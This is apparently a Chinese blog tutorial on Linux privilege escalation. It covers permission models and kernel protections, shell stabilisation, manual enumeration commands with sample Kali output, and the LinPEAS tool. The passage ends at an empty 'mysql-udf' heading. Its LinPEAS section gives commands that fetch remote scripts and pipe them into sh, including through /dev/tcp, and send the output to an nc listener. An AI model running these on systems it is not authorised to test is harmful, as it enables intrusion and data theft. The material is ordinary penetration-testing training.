---
title: Linux 提权专区
date: 2026-01-05T12:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - 技术
---
## Linux 提权简介

提权，即权限提升，源自英语词汇 Privilege Escalation，也可以缩写为 PrivEsca 或 PE。具体提权方法取决于目标系统的配置。我们可以通过分析诸如内核版本、已安装的应用程序、支持的编程语言和其他用户的凭据等关键元素，找到获取 root 权限的方法。这些关键元素通常包括操作系统或应用程序的错误配置、漏洞、超特权用户或弱凭据。

## 提权原理

### 常用权限体系

1. ugo 基本权限：文件权限和所有权，Linux 系统使用基于用户、组和其他用户的权限体系来控制对文件和目录的访问。此外，通过文件的所有者和所属设置，可以实现更细粒度的访问控制。
2. suid、sgid、sticky 权限：它们可以授予用户或组特定的权限，使得在特定的条件下可以执行一些非常有用的操作。前两者程序将以文件 所有者/所有组 的身份来执行，Sticky Bit 权限用于在共享文件夹中限制文件的删除权限。
3. Capabilities：Linux Capabilities 是一种将传统的全局权限分割为更小、独立的权限单元的机制，以便于应用程序和服务分配更细粒度的权限，限制潜在的安全风险。
4. AppArmor 和 SELinux：这两种安全模块通过强制访问控制（MAC）策略增强了系统的安全性。它们可以限制进程和文件的访问权限，从而降低潜在的安全风险。AppArmor 是 MAC 的实现，专为 Linux 系统设计。与 SELinux 不同，APPArmor 使用路径名来识别与保护系统资源，而不是安全上下文。AppArmor 通过定义所谓的 “配置文件”，为每个应用程序设定允许和禁止的操作，从而限制进程对系统资源的访问。AppArmor 相对于 SELinux 来说，更容易配置和管理，但在某些情况下可能不如 SELinux 强大。SELinux 是另一种 MAC 的实现。最初由美国国家安全局（NSA）开发，后来集成到许多 Linux 发行版本中。SELinux 通过为文件、进程等系统资源分配安全上下文（安全标签），并根据预先定义的安全策略规则来控制访问。SELinux 旨在防止恶意软件或由漏洞的应用程序造成的潜在损害，并限制了它们对系统资源的访问。
5. Access Control Lists（ACLs）：ACLs 提供了比传统文件权限更灵活的权限管理方式，允许为特定用户和组分配文件或目录的特定权限。

### 其他 20 个权限体系和安全机制

1. Grsecurity：是一套安全补丁和配置系统，用于 Linux 内核，旨在增强系统的安全性。它包括许多功能，如控制访问、内存保护以及提供系统的稳定性 Grsecurity 通过实现强制访问控制、内存保护以及其他特性，从而降低攻击者利用漏洞的机会。
2. PaX：是一种用于 Linux 内核的内存保护补丁。它旨在防止攻击者利用内存错误，如缓冲区溢出等漏洞。PaX 主要通过两种技术实现保护：地址空间布局随机化（ASLR）和非可执行内存页。这两种技术互相配合，能有效防止攻击者执行恶意代码。
3. polkit（PolicyKit）：是一个用于操作系统级别权限的控制框架，它允许非特权用户执行特权操作。它为应用程序提供了一种有限的授权，使其能够执行需要特权的操作，而无需提升整个应用程序的权限。
4. Execshield：是一种 Linux 内核安全特性，由 Red Hat 公司开发。他的目标是防止缓冲区溢出攻击和其他相关的漏洞利用。Exeshield 的主要功能包括使栈和堆不可执行、随机化内存布局和限制内核态代码的执行。
5. ASLR：ASLR（Address Space Layout Randomization）是一种内存保护技术，用于随机化程序在内存中的地址空间布局。使得攻击者更难预测恶意代码的地址，降低了攻击的可能性。ASLR 可以应用于操作系统内核和用户程序，增强整个系统的安全性。
6. TOMOYO Linux：TOMOYO Linux 是一种用于 Linux 内核的强制访问控制（MAC）安全模块，与 SELinux 和 AppArmor 类似。它通过轻量级的配置和易于理解的策略语法，帮助管理员管理程序和访问权限。
7. SMACK（Simplified Mandatory Access Control Kernel）：SMACK 是一种基于 Linux 的简化强制访问控制内核。它通过为程序分配安全标签来限制进程间通信和文件访问。SMACK 旨在实现简单易用的访问控制策略。
8. IMA（Integrity Measurement Architecture）：IMA 是一种 Linux 安全模块，用于确保文件的完整性。它通过对文件生成数字签名并将其与文件一起储存，以确保文件没有被篡改。IMA 可以与其他安全框架（如 SELinux 或 AppArmor）配合使用，提供更全面的系统安全保护。
9. Yama：Yama 是一种 Linux 安全模块，用于实施一些基本的系统安全策略，例如限制进程跟踪功能。Yama 的目的是提供一些额外的保护措施，以降低潜在漏洞的影响。
10. CGroups（Control Groups）：CGroups 是一种 Linux 内核功能，允许将进程分组分配资源（如 CPU、内存和磁盘空间）。虽然 CGroups 主要用于资源管理，但它也可以用于隔离进程，提高系统安全性。
11. Linux Namespaces：Namespaces 是一种 Linux 内核特性，用于隔离进程的运行环境。Namespaces 可以限制进程访问其他进程、文件系统和网络资源，从而提高系统安全性。
12. StackGuard：StackGuard 是一种编译器扩展，用于防止缓冲区溢出攻击。它在栈帧中插入一个 “canary” 值，以检测潜在的栈溢出。如果 “canary” 值被篡改，程序会在攻击者获得执行权限之前终止，从而阻止攻击。
13. ProPolice：Propolice（也称为 SSP，Stack Smashing Protector）是另一种编译器扩展，类似于 StackGuard。它也在栈帧中插入 “canary” 值，以防止缓冲区溢出攻击。ProPolice 同时还对局部变量进行重新排序，以减小攻击成功的可能性。
14. seccomp：seccomp（安全计算模式）是一种 Linux 内核功能，允许进程限制其系统调用的使用。通过使用 seccomp，程序可以限制其对系统资源的访问，从而提高安全性。seccomp 通常与沙箱技术和容器一起使用，为应用程序提供隔离的运行环境。
15. ptrace：ptrace 是一种允许一个进程观察和控制另一个进程的执行的 Linux 系统调用。虽然 ptrace 通常用于调试目的，但它也可用于实现沙箱和其他安全措施。然而，ptrace 本身可能会被攻击者利用，因此需要谨慎使用。
16. Capsicum：Capsicum 是一种为 Unix-like 系统（如 FreeBSD 和 Linux）提供沙箱和能力分离的安全框架。它允许程序将自己限制在受限的沙箱环境中运行，从而降低潜在漏洞的影响。
17. MPROTECT：MPROTECT 是一种用于标记内存页为只读或不可执行的内核功能。它可以防止攻击者将数据区域（如堆和栈）用于执行恶意代码。MPROTECT 通常与其他内存保护技术（如 ASLR 和 PaX ）一起使用，提高系统安全性。
18. Mandatory Access Control（MAC）：强制控制访问是一种安全策略，强制执行访问控制规则。与自主访问控制（Discretionary Access Control，DAC）相比，MAC 更严格地限制了对象（如文件和进程）之间的交互。AppArmor 和 SELinux 就是 MAC 地实现。
19. Chroot：Chroot 是一种将进程限制在文件系统地子目录中运行地技术，从而限制进程访问系统中的其他部分。尽管 Chroot 可以提供一定程度的隔离，但它并不是一个完全安全的沙箱解决方案。
20. Firejail：Firejail 是一种用于 Linux 和其他 Unix-like 系统的沙箱工具。它允许将程序限制在一个受限的运行环境中，以减少潜在的安全风险。Firejail 可以与 seccomp、namespaces、CGroups 等内核功能结合使用，以提供更强大的隔离和安全保护。
21. Kernel Address Space Layout Randomization（KASLR）：KASLR 是一种内核级别的地址空间布局随机化技术，用于随机化内核代码和数据在内存中的地址。KASLR 旨在防止攻击者利用内核漏洞，从而提高系统安全性。
22. Control Flow Integrity（CFI）：控制流完整性是一种用于检测和防止控制流劫持攻击（如返回导向编程和条约导向编程）的安全策略。CFI 可以在编译器和硬件层面实现，以保护程序免受此类攻击。
23. AddressSanitizer：AddressSanitzer 是一种用于检测内存错误（如缓冲区溢出和使用后释放）的编译器扩展。
24. AM（Pluggable Authentication Modules，可插入认证模块）是一种灵活的认证框架，用于在 Linux 和 UNIX 系统上实现各种认证策略。PAM 允许系统管理员在不修改已有程序的情况下，为各种应用程序和服务配置和管理认证方法。PAM 的核心概念是将认证过程分解为一系列可插入的模块，这些模块可以独立于应用程序进行更新和配置。这种分离使得管理员可以轻松地在系统中添加、删除或更改认证策略，而无需重新编译或修改应用程序。PAM 主要用于以下四个方面：
	1. 认证：验证用户身份，通常是通过检查用户输入的用户名和密码完成。PAM 模块可以支持各种不同地认证方法，如本地密码文件、LDAP、Kerberos 等。
	2. 账户管理：检查用户账户的访问权限，如密码过期、时间限制、IP 地址限制等。账户管理模块可以在用户通过认证后执行这些检查。
	3. 会话管理：管理用户登入会话。会话管理模块可以在用户登录和注销时执行特定的任务，如挂在家目录、设置环境变量等。
	4. 密码管理：处理用户密码更改和相关策略。密码管理模块可以强制实施密码复杂性规则、历史记录检查等。

### 提权原理

1. 低权限可修改的执行文件或脚本，能以高权限身份允许。
2. 从用户行为角度，用低权限用户的运维人员，也需要记忆、输入、备份凭据，以备使用高权限用户完成操作。
3. 在权限的上层，捕捉、拦截、修改凭据信息或权限信息，如一些基于内存读取操作实现的内核利用。

## Linux 提权枚举

### 终端升级与提高稳定性

在 Linux 目标获得立足点时，首先应该尝试的是将 shell 升级为完整的 TTY（交互式 shell）。

```bash
python3 -c 'import pty;pty.spawn("/bin/bash");'
```

或者

```bash
rlwrap nc -lvnp 4444
```

或者

```bash
script -qc /bin/bash /dev/null
```

通常 shell 不允许我们执行 clear 命令进行清屏，可以执行下面命令：

```bash
export TERM=xterm-color
```

### 手工枚举技术

#### whoami

下面是几条用户枚举命令的用法：

1. id：显示当前用户的 UID、GID 以及所属的其他组的信息。id 命令也可以用于获取另一个用户的相同信息。
![](Pasted%20image%2020260105144112.png)
2. who：显示当前登录的用户及相关信息，如登录时间、终端等。
![](Pasted%20image%2020260105144127.png)
3. whoami：显示当前用户的用户名。
![](Pasted%20image%2020260105144156.png)
4. w：提供关于当前登录用户的详细信息，包括它们在做什么以及系统的负载信息。
![](Pasted%20image%2020260105144208.png)
5. last：显示系统最近的登录记录。
![](Pasted%20image%2020260105144235.png)
#### uname -a

为我们提供关于系统使用的内核的详细信息。在寻找可能导致提权的任何潜在的内核漏洞时，这将非常有用。

更全的信息查看：

```bash
uname -a;lsb_release -a;cat /proc/version /etc/issue /etc/*-release
```

![](Pasted%20image%2020260105144601.png)

1. uname -a：这个命令用于显示系统的相关信息，包括内核名称、主机名、内核发行版本、内核版本、硬件名称等。-a 选项表示显示所有可用信息。
2. lsb_release -a：这个命令用于显示 Linux 标准基础（LSB）的发行信息。-a 选项表示显示所有可以信息。它将显示诸如发行编号、发行名称、发行描述等信息。
3. cat /proc/version：这个命令用于显示内核版本和编译信息。`/proc/version` 文件包含内核版本、编译器版本和其他相关信息。要查看是否安装了 GCC 就可以用这条命令。
4. cat /etc/issue：这个命令用于查看系统的发行版本信息。`/etc/issue` 文件包含了操作系统发行版的名称和版本。
5. cat /etc/\*-release：这个命令用于查看系统的发行版本的详细信息。他会搜索 `/etc/` 目录下所有以 `-release` 结尾的文件，并显示它们的内容。这些文件通常包含操作系统的发行名称、版本、代号等信息。

#### ip addr

也可以写作 `ip a`，旧版命令 `ifconfig`，这些命令为我们提供有关网卡、网络配置的信息。多张网卡配合路由信息可以发现内网网段。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:0c:29:88:e4:07 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.5/24 brd 10.10.10.255 scope global dynamic noprefixroute eth0
       valid_lft 1278sec preferred_lft 1278sec
    inet6 fe80::2167:25b3:e756:16ad/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
```

1. ip route：用于查询路由表，`route` 是过时的命令。
![](Pasted%20image%2020260105144710.png)
2. ip neigh：用于查询邻居表。
![](Pasted%20image%2020260105144721.png)
3. arp -a：用于显示 ARP 缓存，有人将他用于内网主机发现。
![](Pasted%20image%2020260105144749.png)

#### hostname

`hostname` 命令用于返回目标机器的主机名。尽管这个值可以轻易地被更改或者具有相对无意义的字符串（如 Ubuntu1），但在某些情况下，它可以提供有关目标系统在网络中的角色信息（例如，表示生产 SQL 服务器的 SQL-Accounts-01）。

![](Pasted%20image%2020260105144807.png)

新内核的 Linux 可以用 `hostnamectl`。

![](Pasted%20image%2020260105145016.png)

#### sudo -l

列出允许用户以 root 权限运行某些（或全部）命令。

![](Pasted%20image%2020260105145158.png)

`kali` 用户拥有 `ALL` 全部权限。

#### capabilities

检测 capabilities：

```bash
getcap -r / 2>/dev/null
```

关于 Linux capabilities，它为进程提供了一部分可用的 root 权限子集。有限地将 root 权限划分为较小且独特的单元。然后，可以独立地将这些单元授予进程。这样，权限集合就会减少，降低了被利用地风险。

![](Pasted%20image%2020260105145758.png)

#### ls -a

在 Linux 中常用的命令之一就是 `ls -a` 参数，笔者一般直接用 `ls -liah` 列出隐藏内容详细信息。

![](Pasted%20image%2020260105150031.png)

1. -l（长格式）：显示文件和目录地详细信息，包括权限、链接数、所有者、用户组、文件修改和最后修改时间。
2. -i（inode 号）：显示每个文件和目录地 inode 编号。inode 是文件系统中用于标识文件地唯一数字标识符。
3. -a（全部文件）：列出所有文件，包括以 . 开头的隐藏文件。
4. -h（人性化格式）：以易读的格式显示文件大小，例如 KB、MB、GB 等。

#### history

使用 `history` 命令查看早期命令可以让我们了解目标系统，尽管很少，但可以储存诸如密码、用户名之类的信息。

![](Pasted%20image%2020260113173925.png)

#### /etc/passwd

阅读 `/etc/passwd` 文件是发现系统上用户的简便方式。

```bash
┌──(kali㉿kali)-[~/Work/Kali]                    
└─$ cat /etc/passwd                                                               
root:x:0:0:root:/root:/usr/bin/zsh               
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  
bin:x:2:2:bin:/bin:/usr/sbin/nologin                                                                   
sys:x:3:3:sys:/dev:/usr/sbin/nologin                                                                   
sync:x:4:65534:sync:/bin:/bin/sync                                                                     
games:x:5:60:games:/usr/games:/usr/sbin/nologin   
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin                                                           
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin                                                            
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
......
```

输出很长，可以通过剪切转换为对暴力破解有用的列表。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ cat /etc/passwd | cut -d ':' -f 1
root 
daemon
bin     
sys      
sync   
games
man 
lp   
mail 
news
uucp                                              
proxy
......
```

`/etc/passwd` 中记载了所有用户（包括系统或服务器用户）。

#### /etc/crontab

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ cat /etc/crontab                 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
#
```

查看自动任务。

#### echo $PATH

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ echo $PATH                                         
/home/kali/.cargo/bin:/home/kali/.local/bin:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/home/kali/.dotnet/tools
```

查看环境变量，也可以使用 `env` 显示更全的环境变量。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ env                                                                                                
COLORFGBG=15;0    
COLORTERM=truecolor
COMMAND_NOT_FOUND_INSTALL_PROMPT=1
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
DESKTOP_SESSION=lightdm-xsession
DISPLAY=:0.0     
DOTNET_CLI_TELEMETRY_OPTOUT=1
GDMSESSION=lightdm-xsession       
HOME=/home/kali
LANG=en_US.UTF-8
LANGUAGE= 
LESS_TERMCAP_mb=                                   
LESS_TERMCAP_md=                                   
LESS_TERMCAP_me=        
LESS_TERMCAP_se=                                   
LESS_TERMCAP_so=        
LESS_TERMCAP_ue=                                                                                       
LESS_TERMCAP_us=                                   
LOGNAME=kali
......
```

#### ps -ef

`ps` 用来查看进程，各个数据列的意义如下：

- PID：进程 ID（进程唯一）
- TTY：用户使用的终端类型
- Time：进程使用的 CPU 时间（并非进程运行时间）
- CMD：正在运行的命令或可执行文件

```bash
┌──(kali㉿kali)-[~/Work/Kali]                                                                          
└─$ ps -ef                                                                                             
UID          PID    PPID  C STIME TTY          TIME CMD                                           
root           1       0  0 04:28 ?        00:00:03 /sbin/init splash           
root           2       0  0 04:28 ?        00:00:00 [kthreadd]                
root           3       2  0 04:28 ?        00:00:00 [pool_workqueue_release]       
root           4       2  0 04:28 ?        00:00:00 [kworker/R-kvfree_rcu_reclaim]
root           5       2  0 04:28 ?        00:00:00 [kworker/R-rcu_gp]
root           6       2  0 04:28 ?        00:00:00 [kworker/R-sync_wq]
......
```

`ps -A` 或 `-e` 查看所有进程，`ps -xjf` 查看进程树：

- a：显示所有进程，包括其他用户进程，如不使用则只显示当前终端会话的相关进程。
- x：显示没有连接到终端的进程，如不适应则显示当前终端会话相关进程。
- j：显示进程树，包含每个进程的父子进程，使用该参数会以树的方式呈现。
- f：以完整格式输出结果。

![](Pasted%20image%2020260113175817.png)

`ps aux` 会查显示所有用户进程（a），显示启动进程的用户（u），并显示未连接到终端的进程（x）。

![](Pasted%20image%2020260113180050.png)

`top -n 1` 可以帮助用户监控系统性能，查看当前运行的进程及其资源使用情况，如 `CPU` 使用率、内存使用情况。`-n` 指定 `top` 命令应显示的迭代次数。在这里，`-n 1` 表示 `top` 只运行一次，然后退出。通常，`top` 命令会持续运行，定期刷新屏幕上的信息。

```bash
┌──(kali㉿kali)-[~/Work/Kali]                                                                          
└─$ top -n 1                                                                                           
top - 05:03:51 up 35 min,  1 user,  load average: 0.17, 0.06, 0.05                                     
Tasks: 249 total,   1 running, 248 sleeping,   0 stopped,   0 zombie                                   
%Cpu(s):  6.4 us,  1.1 sy,  0.0 ni, 92.6 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st 
MiB Mem :  29936.7 total,  28312.6 free,   1169.2 used,    879.6 buff/cache     
MiB Swap:   1024.0 total,   1024.0 free,      0.0 used.  28767.5 avail Mem 

    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND                         
   1095 root      20   0  466292 149692  77600 S  18.2   0.5   0:30.93 Xorg                            
      1 root      20   0   24756  14816  10776 S   0.0   0.0   0:03.35 systemd                         
      2 root      20   0       0      0      0 S   0.0   0.0   0:00.01 kthreadd                        
      3 root      20   0       0      0      0 S   0.0   0.0   0:00.00 pool_workqueue_release          
      4 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 kworker/R-kvfree_rcu_reclaim    
      5 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 kworker/R-rcu_gp                
      6 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 kworker/R-sync_wq               
      7 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 kworker/R-slub_flushwq          
      8 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 kworker/R-netns                 
     10 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 kworker/0:0H-events_highpri     
     12 root      20   0       0      0      0 I   0.0   0.0   0:00.00 kworker/u128:0-ipv6_addrconf    
     13 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 kworker/R-mm_percpu_wq          
     14 root      20   0       0      0      0 I   0.0   0.0   0:00.00 rcu_tasks_kthread               
     15 root      20   0       0      0      0 I   0.0   0.0   0:00.00 rcu_tasks_rude_kthread          
     16 root      20   0       0      0      0 I   0.0   0.0   0:00.00 rcu_tasks_trace_kthread         
     17 root      20   0       0      0      0 S   0.0   0.0   0:00.02 ksoftirqd/0                     
     18 root      20   0       0      0      0 I   0.0   0.0   0:01.21 rcu_preempt                     
     19 root      20   0       0      0      0 S   0.0   0.0   0:00.00 rcu_exp_par_gp_kthread_worker/1 
     20 root      20   0       0      0      0 S   0.0   0.0   0:00.05 rcu_exp_gp_kthread_worker       
     21 root      rt   0       0      0      0 S   0.0   0.0   0:00.06 migration/0                     
     22 root     -51   0       0      0      0 S   0.0   0.0   0:00.00 idle_inject/0                   
     23 root      20   0       0      0      0 S   0.0   0.0   0:00.00 cpuhp/0                         
     24 root      20   0       0      0      0 S   0.0   0.0   0:00.00 cpuhp/1                         
     25 root     -51   0       0      0      0 S   0.0   0.0   0:00.00 idle_inject/1                   
     26 root      rt   0       0      0      0 S   0.0   0.0   0:00.35 migration/1                     
     27 root      20   0       0      0      0 S   0.0   0.0   0:00.03 ksoftirqd/1                     
     29 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 kworker/1:0H-events_highpri     
     30 root      20   0       0      0      0 S   0.0   0.0   0:00.00 cpuhp/2                         
     31 root     -51   0       0      0      0 S   0.0   0.0   0:00.00 idle_inject/2                   
     32 root      rt   0       0      0      0 S   0.0   0.0   0:00.35 migration/2                     
     33 root      20   0       0      0      0 S   0.0   0.0   0:00.01 ksoftirqd/2                     
     35 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 kworker/2:0H-events_highpri     
     36 root      20   0       0      0      0 S   0.0   0.0   0:00.00 cpuhp/3                         
     37 root     -51   0       0      0      0 S   0.0   0.0   0:00.00 idle_inject/3                   
     38 root      rt   0       0      0      0 S   0.0   0.0   0:00.35 migration/3                     
     39 root      20   0       0      0      0 S   0.0   0.0   0:00.01 ksoftirqd/3                     
     41 root       0 -20       0      0      0 I   0.0   0.0   0:00.02 kworker/3:0H-kblockd            
     42 root      20   0       0      0      0 S   0.0   0.0   0:00.00 cpuhp/4                         
     43 root     -51   0       0      0      0 S   0.0   0.0   0:00.00 idle_inject/4                   
     44 root      rt   0       0      0      0 S   0.0   0.0   0:00.35 migration/4
     45 root      20   0       0      0      0 S   0.0   0.0   0:00.01 ksoftirqd/4                     
     47 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 kworker/4:0H-events_highpri     
     48 root      20   0       0      0      0 S   0.0   0.0   0:00.00 cpuhp/5                         
     49 root     -51   0       0      0      0 S   0.0   0.0   0:00.00 idle_inject/5                
```

#### netstat

在对现有的接口和网络路由进行初始检查后，值得查看现有通信。`netstat` 命令可以与几个不同选项一起使用，以收集有关现有连接信息。

- netstat -a：显示所有在监听的端口和已建立的连接。
- `netstat -at` / `netstat -ay`：列出 TCP 或 UDP 协议

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ netstat -at
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN     
tcp6       0      0 [::]:ssh                [::]:*                  LISTEN     
                                                                                                       
┌──(kali㉿kali)-[~/Work/Kali]
└─$ netstat -au
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
udp        0      0 10.10.10.5:bootpc       10.10.10.254:bootps     ESTABLISHED
```

- `netstat -l`：列出处于 “监听” 模式的端口

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ netstat -lt
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN     
tcp6       0      0 [::]:ssh                [::]:*                  LISTEN 
```

- `netstat -s`：按协议列出网络使用统计数据

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ netstat -s 
Ip:
    Forwarding: 2
    29 total packets received
    1 with invalid addresses
    0 forwarded
    0 incoming packets discarded
    28 incoming packets delivered
    34 requests sent out
    40 dropped because of missing route
    OutTransmits: 34
Icmp:
    0 ICMP messages received
    0 input ICMP message failed
    ICMP input histogram:
    4 ICMP messages sent
    0 ICMP messages failed
    ICMP output histogram:
        destination unreachable: 4
IcmpMsg:
        OutType3: 4
Tcp:
    4 active connection openings
    0 passive connection openings
    4 failed connection attempts
    0 connection resets received
    0 connections established
    8 segments received
    8 segments sent out
    0 segments retransmitted
    0 bad segments received
    4 resets sent
Udp:
    17 packets received
    4 packets to unknown port received
    0 packet receive errors
    23 packets sent
    0 receive buffer errors
    0 send buffer errors
    IgnoredMulti: 3
UdpLite:
TcpExt:
    0 packet headers predicted
IpExt:
    InMcastPkts: 1
    OutMcastPkts: 4
    InBcastPkts: 3
    InOctets: 7893
    OutOctets: 4871
    InMcastOctets: 635
    OutMcastOctets: 755
    InBcastOctets: 234
    InNoECTPkts: 29
MPTcpExt:
```

- `netstat -tp`：列出服务名称和 PID 信息的连接
- `netstat -i`：显示接口统计信息

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ netstat -i 
Kernel Interface table
Iface             MTU    RX-OK RX-ERR RX-DRP RX-OVR    TX-OK TX-ERR TX-DRP TX-OVR Flg
eth0             1500        0      0      0 0             0      0      0      0 BMRU
lo              65536        0      0      0 0             0      0      0      0 LRU
```

- `netstat -ano`：显示所有套接字（a）、不解析名称（n）、显示计时器（o）

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ netstat -ano
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)
udp        0      0 10.10.10.5:68           10.10.10.254:67         ESTABLISHED off (0.00/0/0)
raw6       0      0 :::58                   :::*                    7           off (0.00/0/0)
Active UNIX domain sockets (servers and established)
Proto RefCnt Flags       Type       State         I-Node   Path
unix  3      [ ]         STREAM     CONNECTED     16604    
unix  3      [ ]         STREAM     CONNECTED     13991    /run/user/1000/bus
unix  3      [ ]         STREAM     CONNECTED     13920    /run/user/1000/bus
unix  3      [ ]         STREAM     CONNECTED     15235    /run/systemd/journal/stdout
unix  3      [ ]         DGRAM      CONNECTED     6736     
unix  3      [ ]         STREAM     CONNECTED     11367    /run/systemd/journal/stdout
unix  2      [ ACC ]     STREAM     LISTENING     8700     /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     6085     
unix  2      [ ACC ]     STREAM     LISTENING     8701     /run/systemd/io.systemd.MuteConsole
......
```

#### find

下面是查找设置 SUID 位文件的命令。

```shell
find / -perm -u=s type f 2>/dev/null
```

#### which

- whereis：用于查找二进制文件、源文件和 man 手册的位置。它只能查找系统默认路径中的文件，不会搜索其他目录或挂载的磁盘。
- which：查找命令所在的位置，并返回找到的第一个命令的完整路径，并返回找到的第一个命令的完整路径。他会在系统 PATH 环境变量中指定的目录中寻找，并返回找到的第一个可执行文件的路径。如果该命令在多个目录中都存在，则只返回最先找到的那个命令的位置。因此，which 命令通常用于查找可执行文件的位置。
- locate：使用本地数据库来快速查找指定位置，不会实时更新文件系统，使用可能会出现找不到文件的情况，为了保证正确的，可以使用 `updatedb` 命令更新数据库。
- type：用于查找命令是否内置命令、外部命令还是别名。如果是内置命令则返回 ”builtin“，如果是外部命令则返回可执行文件的位置，如果是别名则返回别名定义的命令。
- apropos：用于在系统的 man 手册中搜索与指定关键词相关的条目。它可以帮助用户快速找到特定主题或命令相关手册页。
- find：用于在指定路径下递归搜索符合条件的文件。它可以根据文件名、文件类型、文件大小、文件权限等条件来搜索文件。
- grep：用于在指定文件中查找符合条件的字符串。支持正则表达式，可快速查找文本文件中的关键词。
- where：与 which 类似，但他可以同时查找多个命令，而 which 只能查找单个命令。where 命令会在系统 PATH 环境变量中指定的所有目录中寻找，并放回找到的所有命令的位置。如果该命令在多个目录中都存在则会返回所有找到命令的位置。

#### /etc/fstab

检测未挂载的文件系统。

```shell
cat etc/fstab
```

### 自动化枚举

#### 常用工具

- LinPEAS：全称为 Linux Privilege Awesome Script，是一个用来搜索类 unix 主机上可能的提权路径的自动化脚本。
- LinEnum：一个流行的 Linux 本地枚举脚本，用于收集有关系统的各种信息，识别不安全配置，提取可用于提升权限的漏洞信息。
- linux-smart-enumeration（lse）：一个具有模块化功能的 Linux 本地枚举脚本。
- linux-exploit-suggester：用于识别 Linux 系统中可能存在的可利用漏洞。
- Linuxprivchecker：检查 Linux 系统潜在安全问题的 python 脚本。
- unix-privese-check：识别类 UNIX 系统中可能的权限提升路径。

### LinPEAS 最佳实践

使用 `curl` 直接从 Github 中执行。

```shell
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

使用 wget 下载后给权限单独执行。

```shell
# 本地网络下载 
sudo python3 -m http.server 80 #kali 
curl 10.10.10.5/linpeas.sh | sh #靶机 
# 从内存中执行，结果发回kali 
nc -lvnp 81 | tee linpeas.out #kali 
curl 10.10.10.10/linpeas.sh | sh | nc 10.10.10.10 81 #靶机 
# 没有curl的情况 
sudo nc -q 5 -lvnp 80 < linpeas.sh #kali 
cat < /dev/tcp/10.10.10.10/80 | sh #靶机

# 输出到文件 
./linpeas.sh -a > /dev/shm/linpeas.txt #主机 
less -r /dev/shm/linpeas.txt #读取分色文件
```

使用 LinePEAS 二进制文件。

```shell
wget https://github.com/carlospolop/PEASSng/releases/latest/download/linpeas_linux_amd64 chmod +x linpeas_linux_amd64 ./linpeas_linux_amd64
```

## 提权实战演示

### mysql-udf

